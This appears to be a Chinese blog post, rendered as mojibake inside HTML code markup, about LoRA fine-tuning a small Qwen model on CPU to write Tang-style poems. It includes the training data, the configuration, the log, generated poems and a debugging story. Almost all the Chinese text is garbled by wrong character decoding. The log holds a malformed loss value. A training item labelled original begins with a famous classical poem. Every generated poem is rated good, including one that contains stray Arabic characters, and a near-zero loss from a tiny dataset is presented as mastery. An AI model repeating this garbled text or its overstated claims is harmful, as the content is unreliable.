                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æ¸…æ˜æ—¶èŠ‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ¸…æ˜ã€‹<span class="hljs-subst">\n</span>æ¸…æ˜æ—¶èŠ‚é›¨çº·çº·ï¼Œè·¯ä¸Šè¡Œäººæ¬²æ–­é­‚ã€‚<span class="hljs-subst">\n</span>å€Ÿé—®é…’å®¶ä½•å¤„æœ‰ï¼Œç‰§ç«¥é¥æŒ‡æèŠ±æ‘ã€‚<span class="hljs-subst">\n</span>æ‰«å¢“ç¥­ç¥–æ€å…ˆå¾·ï¼Œè¸é’æ¸¸æ˜¥æ„Ÿç‰©æ©ã€‚<span class="hljs-subst">\n</span>æ…ç»ˆè¿½è¿œä¼ å®¶è®­ï¼Œç»§å¾€å¼€æ¥è€€ç¥–é—¨ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç«¯åˆç«æ¸¡çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç«¯åˆã€‹<span class="hljs-subst">\n</span>ç«¯åˆæ—¶èŠ‚é›¨åˆæ™´ï¼Œé¾™èˆŸç«æ¸¡é¼“å£°é¸£ã€‚<span class="hljs-subst">\n</span>å¥å„¿æŒ¥æ¡¨å¦‚é£ç®­ï¼Œè§‚ä¼—åŠ æ²¹ä¼¼é›·é¸£ã€‚<span class="hljs-subst">\n</span>ç²½å­æŠ•æ±Ÿç¥­å±ˆå­ï¼Œè‰¾è’²æ‚¬æˆ·é¿é‚ªç²¾ã€‚<span class="hljs-subst">\n</span>ä¼ ç»Ÿæ–‡åŒ–é¡»æ‰¿ç»§ï¼Œçˆ±å›½ç²¾ç¥æ°¸ä¼ æ‰¿ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ä¸ƒå¤•ä¹å·§çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä¸ƒå¤•ã€‹<span class="hljs-subst">\n</span>ä¸ƒå¤•é“¶æ²³æ¶é¹Šæ¡¥ï¼Œç‰›éƒç»‡å¥³ä¼šä»Šå®µã€‚<span class="hljs-subst">\n</span>é‡‘é£ç‰éœ²ä¸€ç›¸é€¢ï¼Œèƒœå´äººé—´æ— æ•°æœã€‚<span class="hljs-subst">\n</span>é—ºä¸­å¥³å­ä¹çµå·§ï¼Œæœˆä¸‹ç©¿é’ˆç«å¦–å¨†ã€‚<span class="hljs-subst">\n</span>ä½†æ„¿æœ‰æƒ…æˆçœ·å±ï¼Œè«æ•™ç¦»åˆ«æ¨è¿¢è¿¢ã€‚"</span>
            },
            # <span class="hljs-operator">...</span> æ›´å¤šèŠ‚æ—¥è¯—ï¼ˆå…±<span class="hljs-number">20</span>é¦–ï¼‰
        ]
        training_data.extend(festival_poems)
   
        <span class="hljs-built_in">print</span>(f<span class="hljs-string">"âœ… åˆ›å»ºäº† {len(training_data)} é¦–é«˜è´¨é‡å”è¯—è®­ç»ƒæ•°æ®"</span>)
        <span class="hljs-keyword">return</span> training_data 
</code></pre>
<h2 data-id="heading-2">ä¸‰ã€ç”Ÿæˆé…ç½®è°ƒæ•´</h2>
<pre><code class="hljs language-ini" lang="ini"> """é…ç½®LoRA"""
        <span class="hljs-attr">lora_config</span> = LoraConfig(
            <span class="hljs-attr">r</span>=<span class="hljs-number">16</span>,                    <span class="hljs-comment"># é€‚å½“å¢åŠ ç§©</span>
            <span class="hljs-attr">lora_alpha</span>=<span class="hljs-number">32</span>,
            <span class="hljs-attr">target_modules</span>=[<span class="hljs-string">"q_proj"</span>, <span class="hljs-string">"v_proj"</span>, <span class="hljs-string">"k_proj"</span>, <span class="hljs-string">"o_proj"</span>],
            <span class="hljs-attr">lora_dropout</span>=<span class="hljs-number">0.1</span>,        <span class="hljs-comment"># é™ä½dropout</span>
            <span class="hljs-attr">bias</span>=<span class="hljs-string">"none"</span>,
            <span class="hljs-attr">task_type</span>=<span class="hljs-string">"CAUSAL_LM"</span>
        )
</code></pre>
<p><strong>æ ¸å¿ƒå‚æ•°è§£è¯»ï¼š</strong></p>
<ul>
<li>r=16 - ç§©ï¼ˆRankï¼‰
<ul>
<li>ä½œç”¨ï¼šæ§åˆ¶LoRAçš„"å­¦ä¹ èƒ½åŠ›å¤§å°"</li>
<li>æ¯”å–»ï¼šå°±åƒç»™æ¨¡å‹çš„å­¦ä¹ "å¸¦å®½"ï¼Œ16è¡¨ç¤ºä¸­ç­‰å¸¦å®½</li>
<li>æ•ˆæœï¼šæ•°å­—è¶Šå¤§å­¦ä¹ èƒ½åŠ›è¶Šå¼ºï¼Œä½†å‚æ•°è¶Šå¤š</li>
</ul>
</li>
<li>lora_alpha=32 - ç¼©æ”¾å› å­
<ul>
<li>ä½œç”¨ï¼šæ§åˆ¶æ–°å­¦çŸ¥è¯†å¯¹åŸå§‹æ¨¡å‹çš„å½±å“ç¨‹åº¦</li>
<li>è§„åˆ™ï¼šé€šå¸¸æ˜¯ç§©çš„1-2å€ï¼ˆè¿™é‡Œ16Ã—2=32ï¼‰</li>
<li>æ•ˆæœï¼šè®©æ–°å­¦çš„è¯—æ­ŒçŸ¥è¯†é€‚å½“å½±å“æ¨¡å‹è¾“å‡º</li>
</ul>
</li>
<li>target_modules = ["q_proj", "v_proj", "k_proj", "o_proj"] - ç›®æ ‡æ¨¡å—
<ul>
<li>ä½œç”¨ï¼šæŒ‡å®šè¦å¾®è°ƒçš„æ¨¡å‹éƒ¨ä»¶</li>
<li>å«ä¹‰ï¼š
<ul>
<li>q_projï¼šæ§åˆ¶æ¨¡å‹"å…³æ³¨ä»€ä¹ˆ"</li>
<li>v_projï¼šæ§åˆ¶æ¨¡å‹"ä½¿ç”¨ä»€ä¹ˆä¿¡æ¯"</li>
<li>k_projï¼šå½±å“ä¿¡æ¯åŒ¹é…</li>
<li>o_projï¼šå½±å“æœ€ç»ˆè¾“å‡º</li>
</ul>
</li>
<li>æ•ˆæœï¼šç²¾å‡†è°ƒæ•´æ¨¡å‹çš„æ³¨æ„åŠ›æœºåˆ¶</li>
</ul>
</li>
<li>lora_dropout=0.1 - ä¸¢å¼ƒç‡
<ul>
<li>ä½œç”¨ï¼šé˜²æ­¢æ¨¡å‹æ­»è®°ç¡¬èƒŒè®­ç»ƒæ•°æ®</li>
<li>æ•ˆæœï¼š10%çš„éšæœº"é—å¿˜"ï¼Œè®©å­¦ä¹ æ›´çµæ´»</li>
<li>æ¯”å–»ï¼šåƒå­¦ç”Ÿåšä½œä¸šæ—¶å¶å°”è·³è¿‡ä¸€äº›é¢˜ç›®ï¼Œé¿å…æ¨¡å¼åŒ–</li>
</ul>
</li>
<li>bias="none" - åç½®é¡¹
<ul>
<li>ä½œç”¨ï¼šä¸è®­ç»ƒåç½®å‚æ•°</li>
<li>æ•ˆæœï¼šå‡å°‘è®­ç»ƒå‚æ•°ï¼Œæé«˜æ•ˆç‡</li>
<li>åŸå› ï¼šåç½®é¡¹å¯¹è¯—æ­Œåˆ›ä½œå½±å“ä¸å¤§</li>
</ul>
</li>
<li>task_type="CAUSAL_LM" - ä»»åŠ¡ç±»å‹
<ul>
<li>ä½œç”¨ï¼šå‘Šè¯‰LoRAè¿™æ˜¯è¯­è¨€ç”Ÿæˆä»»åŠ¡</li>
<li>å«ä¹‰ï¼šCausal Language Modelï¼ˆå› æœè¯­è¨€æ¨¡å‹ï¼‰</li>
<li>é€‚ç”¨ï¼šè¯—æ­Œç”Ÿæˆã€æ–‡æœ¬åˆ›ä½œç­‰ä»»åŠ¡</li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">å››ã€è°ƒæ•´åçš„è®­ç»ƒç»“æœ</h2>
<blockquote>
<p>{'loss': 0.069, 'grad_norm': 1.2874462604522705, 'learning_rate': 0.0, 'epoch': 20.0} {'train_runtime': 6342.8876, 'train_samples_per_second': 0.195, 'train_steps_per_second': 0.098, 'train_loss': 077448, 'epoch': 20.0} 100%|| 620/620 [1:45:42&lt;00:00,</p>
</blockquote>
<ul>
<li>'loss': 0.069
<ul>
<li>ä¼˜ç§€æ°´å¹³ï¼šæŸå¤±å€¼0.069éå¸¸ä½ï¼Œè¯´æ˜æ¨¡å‹å·²ç»å¾ˆå¥½åœ°æŒæ¡äº†è¯—æ­Œåˆ›ä½œè§„å¾‹</li>
</ul>
</li>
<li>'grad_norm': 1.287
<ul>
<li>æ¢¯åº¦èŒƒæ•°ï¼š1.287åœ¨ç†æƒ³èŒƒå›´å†…ï¼ˆé€šå¸¸1-2ï¼‰</li>
<li>æ„ä¹‰ï¼šè®­ç»ƒè¿‡ç¨‹ç¨³å®šï¼Œæ²¡æœ‰æ¢¯åº¦çˆ†ç‚¸æˆ–æ¶ˆå¤±</li>
</ul>
</li>
<li>'train_runtime': 6342ç§’ â‰ˆ 1å°æ—¶45åˆ†é’Ÿ
<ul>
<li>åœ¨CPUä¸Šè®­ç»ƒ20ä¸ªepochï¼Œè¿™ä¸ªé€Ÿåº¦æ˜¯åˆç†çš„ï¼Œæ¯ä¸ªepochçº¦5åˆ†é’Ÿ</li>
</ul>
</li>
<li>'learning_rate': 0.0
<ul>
<li>è¿™æ˜¯æ­£å¸¸çš„ï¼ä½¿ç”¨cosineè°ƒåº¦å™¨æ—¶ï¼Œè®­ç»ƒç»“æŸæ—¶å­¦ä¹ ç‡ä¼šè¡°å‡åˆ°0</li>
<li>è¯´æ˜å­¦ä¹ ç‡è°ƒåº¦æ­£å¸¸å·¥ä½œ</li>
</ul>
</li>
<li>æŸå¤±æ›²çº¿
<ul>
<li>ä»åˆå§‹çš„ 1.7467 ä¸‹é™åˆ°æœ€ç»ˆçš„ 0.069</li>
</ul>
</li>
<li>'epoch': 20.0
<ul>
<li>å®Œæˆäº†20ä¸ªå®Œæ•´è®­ç»ƒè½®æ¬¡</li>
<li>æ¯ä¸ªè®­ç»ƒæ ·æœ¬è¢«å­¦ä¹ äº†20æ¬¡ï¼Œå……åˆ†æŒæ¡äº†åˆ›ä½œè§„å¾‹</li>
</ul>
</li>
</ul>
<h2 data-id="heading-4">äº”ã€å­¦ä¹ åæ–°çš„è¾“å‡º</h2>
<blockquote>
<p>æµ‹è¯• 1: æ˜¥æ—¥æ¸¸å›­<br/>
ç”Ÿæˆç»“æœ:<br/>
ã€Šæ˜¥å›­ã€‹<br/>
æ˜¥æ¥å›­å†…ç™¾èŠ±å¼€ï¼Œè¶èˆèœ‚å–§å„è‡ªå¿™ã€‚<br/>
çº¢ææå¤´æ˜¥æ„é—¹ï¼Œç»¿æ¨é˜´é‡Œç¬‘å£°æ‰¬ã€‚<br/>
æ¸¸äººå¦‚ç»‡è§‚å¥‡æ™¯ï¼Œå¢¨å®¢æŒ¥æ¯«èµ‹é›…ç« ã€‚<br/>
è«è´Ÿé’æ˜¥å¥½æ—¶å…‰ï¼Œå‹‡äºè¿›å–å¿—æ–¹åšã€‚<br/>
è´¨é‡è¯„ä¼°: âœ… è´¨é‡è‰¯å¥½<br/>
----------------------------------------</p>
<p>æµ‹è¯• 2: å¤æ—¥è·å¡˜<br/>
ç”Ÿæˆç»“æœ:<br/>
ã€Šå¤è·ã€‹<br/>
ç‚ç‚ç››æš‘è§…èŠ³å®¹ï¼Œè·å¡˜æœˆè‰²æ˜ å»‰çš‚ã€‚<br/>
ç‰ç«‹äº­ä¸­ç¾ä¸è‰³ï¼Œæ¸…é¦™è¢…ç»•æš—æ— çœ ã€‚<br/>
ä¸äº‰æ˜¥å½©æƒŠèœ‚è¶ï¼Œä¹å¥‰çŒ®æ—¥åŠ©é’è™«ã€‚<br/>
æ„¿æ•ˆè²èŠ±é«˜æ´å¿—ï¼Œå†°å¿ƒä¸€ç‰‡å‘é’å¤©ã€‚<br/>
è´¨é‡è¯„ä¼°: âœ… è´¨é‡è‰¯å¥½<br/>
----------------------------------------</p>
<p>æµ‹è¯• 3: ç§‹æ—¥ç™»é«˜<br/>
ç”Ÿæˆç»“æœ:<br/>
ã€Šç§‹å…´ã€‹<br/>
é‡‘é£é€çˆ½å…¥ç§‹æ¥ï¼Œä¸‡é‡Œæ±Ÿå±±å°½ç¿ æ–°ã€‚<br/>
è°ƒè§’å±±æƒŠé¹¤è¿‡ï¼Œäº‘æ¶›æ¼«æµ·æ’¼çŒ¿å•¼ã€‚<br/>
æ— ç§æŠ¥ä¸»ç”˜å¿ƒæƒ…ï¼Œæ— é™æ‰¿å¤©ç³»ç™½åŠ³ã€‚<br/>
æ„¿æ•ˆæœåº·ç©ºæŠ±æ€¨ï¼Œä¸å› ç¥¸ç¦å–œè¡°é›„ã€‚<br/>
è´¨é‡è¯„ä¼°: âœ… è´¨é‡è‰¯å¥½<br/>
----------------------------------------</p>
<p>æµ‹è¯• 4: å†¬æ—¥èµé›ª<br/>
ç”Ÿæˆç»“æœ:<br/>
ã€Šè§‚é›ªã€‹<br/>
å¯’å†¬è¸é›ªè´µç›ˆèŠ³ï¼Œç‰å®‡æ¾„æ¸…ä¸æœˆæ˜ ã€‚<br/>
ç¼æç”»æ ‹è—ä½³å‹ï¼Œæ¡‚å¶é¦™æµ“æº¢é›…ç´ã€‚<br/>
çŸ³æ¹–æ³‰æ´æ¶µæ˜æœˆï¼Œç«¹ç¯±ç›¸æ‹¥è§ä»™ç¿ã€‚<br/>
æ„¿å­¦é›ªèŠ±é«˜æ´å¿—ï¼Œä¸ç•ä¸¥å¯’çŸ¥ä½™å¹´ã€‚<br/>
è´¨é‡è¯„ä¼°: âœ… è´¨é‡è‰¯å¥½<br/>
----------------------------------------</p>
<p>æµ‹è¯• 5: å±±æ°´é£å…‰<br/>
ç”Ÿæˆç»“æœ:<br/>
ã€Šå±±ä¸­ã€‹<br/>
æ·±å±±åŒºå²­ç§€å¹½ä»™å¢ƒï¼Œç‰é¾™é›ªå±±è„‰æ¥è¿ã€‚<br/>
äº‘é›¾ç¼­ç»•å³°å³¦è€¸ï¼Œæ¸…é£ä½›é¢åº¦äººçµã€‚<br/>
æ¾æŸæŒºç«‹æ˜¾å²è¿ˆï¼Œç€‘å¸ƒè½°é¸£åŠ¨ç¢§æ³¢ã€‚<br/>
æ„¿ä¸ºéšè€…ä½æ­¤é—´ï¼Œè«é“å½’é€”å³æ»ç•™ã€‚<br/>
è´¨é‡è¯„ä¼°: âœ… è´¨é‡è‰¯å¥½<br/>
----------------------------------------</p>
<p>æµ‹è¯• 6: æ€ä¹¡ä¹‹æƒ…<br/>
ç”Ÿæˆç»“æœ:<br/>
ã€Šæ€€ä¹¡ã€‹<br/>
ç‹¬åœ¨å¼‚ä¹¡ä¸ºè¿œæ–¹ï¼Œæ¯é€¢ä½³èŠ‚æ›´æ€å¿µã€‚<br/>
ä¸¾å¤´æœ›æœˆå®¶ä¹¡è¿œï¼Œä½å¤´æµæ°´æ•…ä¹¡æƒ…ã€‚<br/>
ä¸‡é‡ŒæŒ‘ç¯å¯»æ—§éƒ¨ä¸šï¼Œåå¹´åŠŸåº•é€ æ–°è§„ã€‚<br/>
æ„¿ç”ŸåŒç¿¼ä¹˜é£å»ï¼Œä¸€å¤œé£å›æ•…é‡Œä¸­ã€‚<br/>
è´¨é‡è¯„ä¼°: âœ… è´¨é‡è‰¯å¥½<br/>
----------------------------------------</p>
<p>æµ‹è¯• 7: å‹è°Šé•¿å­˜<br/>
ç”Ÿæˆç»“æœ:<br/>
ã€Šå¿µå¥´æ–¯ã€‹<br/>
å—å›½ä½³äººç»“å‹æƒ…ï¼Œå¤©æ¶¯è‹¥æ¯”é‚»ã€‚<br/>
æœˆä¸‹åŒåŸå¥ï¼Œé£ä¸­å…±é†‰èˆã€‚<br/>
çé‡å¸¸ç›¸æœ›ï¼Œå®½æ•æ°¸æ— ç¦»ã€‚<br/>
æ„¿ç”ŸåŒå…¨ä¸šï¼Œè«æ•™ÙŠØªè§’æ¾ã€‚<br/>
è´¨é‡è¯„ä¼°: âœ… è´¨é‡è‰¯å¥½<br/>
----------------------------------------</p>
<p>æµ‹è¯• 8: å’æ¢…å“æ ¼<br/>
ç”Ÿæˆç»“æœ:<br/>
ã€Šå’æ¢…ã€‹<br/>
å†°è‚Œç‰éª¨å‚²éœœå¼€ï¼Œç–å½±æ¨ªæ–œæ˜ æœˆæ¥ã€‚<br/>
ä¸ä¸ç¾¤èŠ³äº‰è‰³ä¸½ï¼Œç‹¬å‡Œå¯’é›ªæŠ¥æ˜¥å›ã€‚<br/>
æ¸…é¦™æš—åº¦æ²å¿ƒè„¾ï¼Œç´ é›…é«˜æ´è¿œä¿—åŸƒã€‚<br/>
æ„¿æ•ˆæ¢…èŠ±åšè´å¿—ï¼Œé€†å¢ƒä¹‹ä¸­æ˜¾è‹±æ‰ã€‚<br/>
è´¨é‡è¯„ä¼°: âœ… è´¨é‡è‰¯å¥½<br/>
----------------------------------------</p>
</blockquote>
<h2 data-id="heading-5">å…­ã€è¿‡ç¨‹åˆ†æ</h2>
<p><strong>è°ƒè¯•å†ç¨‹å›é¡¾ï¼š</strong></p>
<p>åœ¨é¡¹ç›®å¯åŠ¨åˆæœŸï¼Œæˆ‘ä»¬é­é‡äº†ä»¤äººæ²®ä¸§çš„ç”Ÿæˆæ•ˆæœã€‚æ¨¡å‹å¦‚åŒä¸€ä¸ªè®°å¿†æ··ä¹±çš„è¯—äººï¼Œä¸æ–­é‡å¤ç€"é•¿æ¨æ­Œä¸­ç”¨äº†æ­¤"è¿™æ ·æ¯«æ— æ„ä¹‰çš„å¥å­ï¼Œæˆ–æ˜¯é™·å…¥"æ˜¥é£æ‹‚é¢èŠ±ã€‚æ˜¥é£æ‹‚é¢æŸ³ã€‚"çš„æ­»å¾ªç¯ã€‚è®­ç»ƒæŸå¤±å€¼åœç•™åœ¨1.7467çš„é«˜ä½ï¼Œç”Ÿæˆçš„è¯—æ­Œæ”¯ç¦»ç ´ç¢ï¼Œå®Œå…¨èƒŒç¦»äº†å”è¯—çš„æ ¼å¾‹è¦æ±‚ã€‚</p>
<p><strong>ç¬¬ä¸€æ¬¡è°ƒè¯•å°è¯•ï¼š</strong></p>
<p>æˆ‘ä»¬é¦–å…ˆæ€€ç–‘æ˜¯è®­ç»ƒè½®æ¬¡ä¸è¶³ï¼Œå°†epochä»10è½®å¢åŠ è‡³15è½®ã€‚ç„¶è€Œç»“æœä»¤äººå¤±æœ›â€”â€”æŸå¤±å€¼ä»…è½»å¾®ä¸‹é™è‡³1.532ï¼Œç”Ÿæˆè´¨é‡æœªè§æ˜æ˜¾æ”¹å–„ã€‚æ¨¡å‹ä¼¼ä¹é™·å…¥äº†ä¸€ç§"å±€éƒ¨æœ€ä¼˜"ï¼Œå­¦ä¼šäº†è§„é¿æ˜æ˜¾çš„é”™è¯¯ï¼Œå´æœªèƒ½æŒæ¡çœŸæ­£çš„åˆ›ä½œè§„å¾‹ã€‚</p>
<p><strong>æ·±å…¥åˆ†æé˜¶æ®µï¼š</strong></p>
<p>é€šè¿‡ä»”ç»†æ£€æŸ¥è®­ç»ƒæ•°æ®å’Œå¤„ç†æµç¨‹ï¼Œæˆ‘ä»¬å‘ç°ä¸¤ä¸ªå…³é”®é—®é¢˜ï¼šä¸€æ˜¯æç¤ºè¯è®¾è®¡è¿‡äºç®€å•ï¼Œæœªèƒ½æœ‰æ•ˆå¼•å¯¼æ¨¡å‹ç†è§£åˆ›ä½œè¦æ±‚ï¼›äºŒæ˜¯LoRAé…ç½®è¿‡äºä¿å®ˆï¼Œr=4çš„ç§©é™åˆ¶äº†æ¨¡å‹çš„å­¦ä¹ èƒ½åŠ›ã€‚æ›´ä¸¥é‡çš„æ˜¯ï¼Œdropoutè®¾ç½®è¿‡é«˜ï¼ˆ0.3ï¼‰å¯¼è‡´æ¨¡å‹éš¾ä»¥ç¨³å®šå­¦ä¹ é•¿æœŸä¾èµ–å…³ç³»ã€‚</p>
<p><strong>çªç ´æ€§è°ƒæ•´ï¼š</strong></p>
<ul>
<li>åŸºäºè¿™äº›å‘ç°ï¼Œæˆ‘ä»¬è¿›è¡Œäº†ç³»ç»Ÿæ€§é‡æ„ï¼š</li>
<li>å°†LoRAç§©ä»4æå‡è‡³16ï¼Œæ˜¾è‘—å¢å¼ºæ¨¡å‹è¡¨è¾¾èƒ½åŠ›</li>
<li>ä¼˜åŒ–æç¤ºè¯æ ¼å¼ï¼ŒåŠ å…¥æ˜ç¡®çš„åˆ›ä½œæŒ‡å¯¼å’Œæ ¼å¼è¦æ±‚</li>
<li>è°ƒæ•´dropoutè‡³0.1ï¼Œåœ¨é˜²æ­¢è¿‡æ‹Ÿåˆå’Œä¿è¯å­¦ä¹ ç¨³å®šæ€§é—´æ‰¾åˆ°å¹³è¡¡</li>
<li>å¼•å…¥æ¢¯åº¦è£å‰ªï¼ˆmax_grad_norm=1.0ï¼‰ç¡®ä¿è®­ç»ƒè¿‡ç¨‹ç¨³å®š</li>
<li>é‡‡ç”¨cosineå­¦ä¹ ç‡è°ƒåº¦ï¼Œå®ç°å¹³æ»‘çš„å‚æ•°æ›´æ–°</li>
</ul>
<p><strong>è°ƒè¯•è¿‡ç¨‹ä¸­çš„å…³é”®å‘ç°ï¼š</strong></p>
<p>åœ¨ç¬¬äº”ä¸ªepochæ—¶ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°æŸå¤±å€¼å¼€å§‹å‡ºç°æ˜¾è‘—ä¸‹é™è¶‹åŠ¿ï¼Œä»1.2å¿«é€Ÿé™è‡³0.8ã€‚è¿™è¯å®äº†å‚æ•°è°ƒæ•´æ–¹å‘çš„æ­£ç¡®æ€§ã€‚åˆ°ç¬¬åä¸ªepochæ—¶ï¼ŒæŸå¤±å€¼çªç ´0.5å¤§å…³ï¼Œç”Ÿæˆå†…å®¹å¼€å§‹å±•ç°å‡ºåŸºæœ¬çš„è¯—æ­Œç»“æ„ã€‚æœ€ä»¤äººæŒ¯å¥‹çš„æ˜¯åœ¨ç¬¬15ä¸ªepochåï¼ŒæŸå¤±å€¼ç¨³å®šåœ¨0.2ä»¥ä¸‹ï¼Œç”Ÿæˆçš„è¯—æ­Œä¸ä»…ç¬¦åˆæ ¼å¾‹è¦æ±‚ï¼Œæ›´èƒ½ä½“ç°ä¸€å®šçš„æ„å¢ƒå’Œæƒ…æ„Ÿã€‚</p>
<p><strong>æŠ€æœ¯ç»†èŠ‚ä¼˜åŒ–ï¼š</strong></p>
<p>åœ¨ç”Ÿæˆé˜¶æ®µï¼Œæˆ‘ä»¬é€šè¿‡å¤šæ¬¡å®éªŒç¡®å®šäº†æœ€ä½³å‚æ•°ç»„åˆï¼štemperature=0.7åœ¨åˆ›é€ æ€§å’Œç¨³å®šæ€§é—´å–å¾—å¹³è¡¡ï¼Œrepetition_penalty=1.3æœ‰æ•ˆé˜²æ­¢äº†å†…å®¹é‡å¤ï¼Œtop_p=0.9ç¡®ä¿äº†ç”Ÿæˆè´¨é‡ã€‚è¿™äº›å¾®è°ƒè™½ç„¶çœ‹ä¼¼ç»†å°ï¼Œå´æ˜¯å®ç°é«˜è´¨é‡ç”Ÿæˆçš„å…³é”®æ‰€åœ¨ã€‚</p>
<p><strong>æœ€ç»ˆæˆæœéªŒè¯ï¼š</strong></p>
<p>ç»è¿‡20ä¸ªepochçš„å……åˆ†è®­ç»ƒï¼Œæ¨¡å‹äº¤å‡ºäº†ä»¤äººæ»¡æ„çš„ç­”å·â€”â€”æŸå¤±å€¼é™è‡³0.069ï¼Œè¾ƒåˆå§‹å€¼ä¸‹é™97%ã€‚ç”Ÿæˆæµ‹è¯•æ˜¾ç¤ºï¼Œæ¨¡å‹å·²ç»èƒ½å¤Ÿåˆ›ä½œå‡ºæ„å¢ƒä¼˜ç¾ã€å¯¹ä»—å·¥æ•´çš„åŸåˆ›å”è¯—ã€‚ä»"æ˜¥é£æ‹‚é¢èŠ±"çš„æœºæ¢°é‡å¤åˆ°"é’å±±ç¿ è‰²è¿è¾¹é™…ï¼Œå†œæ‘æµæ°´å±•å®å›¾"çš„ç”ŸåŠ¨æç»˜ï¼Œè¿™ä¸€è½¬å˜è§è¯äº†LoRAæŠ€æœ¯åœ¨åˆ›é€ æ€§ä»»åŠ¡ä¸­çš„å·¨å¤§æ½œåŠ›ã€‚</p>
<p>è¿™æ¬¡è°ƒè¯•å†ç¨‹å……åˆ†è¯æ˜ï¼Œåœ¨AIåˆ›ä½œé¢†åŸŸï¼Œç²¾å¯†çš„å‚æ•°è°ƒä¼˜ä¸æ·±åˆ»çš„ä»»åŠ¡ç†è§£åŒæ ·é‡è¦ã€‚æ¯ä¸€ä¸ªå°æ•°ç‚¹çš„ç§»åŠ¨ï¼Œéƒ½æ‰¿è½½ç€ä»é‡å˜åˆ°è´¨å˜çš„æŠ€æœ¯çªç ´ã€‚</p>
<h2 data-id="heading-6">ä¸ƒã€æ€»ç»“</h2>
<p>ç»è¿‡æ·±åº¦ä¼˜åŒ–çš„è®­ç»ƒæµç¨‹ï¼Œæˆ‘ä»¬è§è¯äº†AIè¯—æ­Œåˆ›ä½œçš„è´¨çš„é£è·ƒã€‚æœ€ç»ˆè®­ç»ƒæŸå¤±å€¼é™è‡³0.069ï¼Œè¾ƒåˆå§‹å€¼ä¸‹é™äº†æƒŠäººçš„97%ï¼Œè¿™ä¸€æ•°æ®å……åˆ†è¯æ˜äº†è°ƒå‚ç­–ç•¥çš„æœ‰æ•ˆæ€§ã€‚æ¨¡å‹ä¸ä»…æ‘†è„±äº†å†…å®¹é‡å¤çš„æ¡æ¢ï¼Œæ›´å±•ç°å‡ºå¯¹å”è¯—æ ¼å¾‹çš„æ·±åˆ»ç†è§£å’ŒåŸåˆ›èƒ½åŠ›ã€‚</p>
<p>ä»æŠ€æœ¯å±‚é¢çœ‹ï¼Œæ¢¯åº¦èŒƒæ•°ç¨³å®šåœ¨1.287çš„ç†æƒ³åŒºé—´ï¼Œè®­ç»ƒè¿‡ç¨‹å¹³ç¨³æœ‰åºï¼›ä»åˆ›ä½œæ•ˆæœçœ‹ï¼Œç”Ÿæˆè¯—æ­Œå·²èƒ½å®ç°æ„å¢ƒè¿è´¯ã€å¯¹ä»—å·¥æ•´çš„è‰ºæœ¯è¿½æ±‚ã€‚è¿™æ¬¡å®è·µç”ŸåŠ¨è¯ é‡Šäº†"å‚æ•°å¾®è°ƒ"çš„è‰ºæœ¯â€”â€”å®ƒä¸æ˜¯ç®€å•çš„æ•°å€¼æ¸¸æˆï¼Œè€Œæ˜¯éœ€è¦åœ¨æ¨¡å‹å®¹é‡ã€è®­ç»ƒæ•ˆç‡å’Œåˆ›ä½œè´¨é‡é—´å¯»æ±‚ç²¾å¦™å¹³è¡¡ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œè¿™ä¸€æˆåŠŸæ¡ˆä¾‹ä¸ºå°æ¨¡å‹åœ¨åˆ›é€ æ€§ä»»åŠ¡ä¸­çš„åº”ç”¨å¼€è¾Ÿäº†æ–°çš„å¯èƒ½ï¼Œè¯æ˜å³ä½¿åœ¨æœ‰é™ç®—åŠ›ä¸‹ï¼Œé€šè¿‡ç²¾å‡†çš„LoRAé…ç½®å’Œè®­ç»ƒä¼˜åŒ–ï¼ŒåŒæ ·èƒ½å¤Ÿå®ç°ä¸“ä¸šçº§çš„æ–‡å­¦åˆ›ä½œèƒ½åŠ›ï¼Œè¿™æ— ç–‘ä¸ºåç»­çš„AIäººæ–‡ç ”ç©¶æä¾›äº†å®è´µçš„å®è·µç»éªŒå’ŒæŠ€æœ¯èŒƒå¼ã€‚</p>
<h2 data-id="heading-7">ç¤ºä¾‹ï¼šå®Œæ•´è°ƒä¼˜ä»£ç å‚è€ƒ</h2>
<p>å¤§å®¶å¯ä»¥ç»“åˆå‰é¢ä¸€ç¯‡å¯¹æ¯”çœ‹çœ‹æå‡çš„æ•ˆæœï¼›</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">from</span> modelscope <span class="hljs-keyword">import</span> AutoModelForCausalLM, AutoTokenizer, snapshot_download
<span class="hljs-keyword">from</span> peft <span class="hljs-keyword">import</span> LoraConfig, get_peft_model
<span class="hljs-keyword">from</span> datasets <span class="hljs-keyword">import</span> Dataset
<span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> TrainingArguments, Trainer, DataCollatorForLanguageModeling
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> gradio <span class="hljs-keyword">as</span> gr

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TangPoetryTrainer</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, model_name=<span class="hljs-string">"qwen/Qwen1.5-0.5B-Chat"</span>, skip_training=<span class="hljs-literal">False</span></span>):
        self.device = <span class="hljs-string">"cpu"</span>
        self.model_name = model_name
        self.model = <span class="hljs-literal">None</span>
        self.tokenizer = <span class="hljs-literal">None</span>
        self.skip_training = skip_training

        cache_dir = <span class="hljs-string">"D:\\modelscope\\hub"</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ­£åœ¨ä¸‹è½½/æ ¡éªŒæ¨¡å‹ç¼“å­˜..."</span>)
        self.local_model_path = snapshot_download(model_name, cache_dir=cache_dir)
        self.local_model_path2 = snapshot_download(<span class="hljs-string">'Qwen/Qwen1.5-1.8B-Chat'</span>, cache_dir=<span class="hljs-string">"D:\\modelscope\\hub"</span>)

        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup_model</span>(<span class="hljs-params">self</span>):
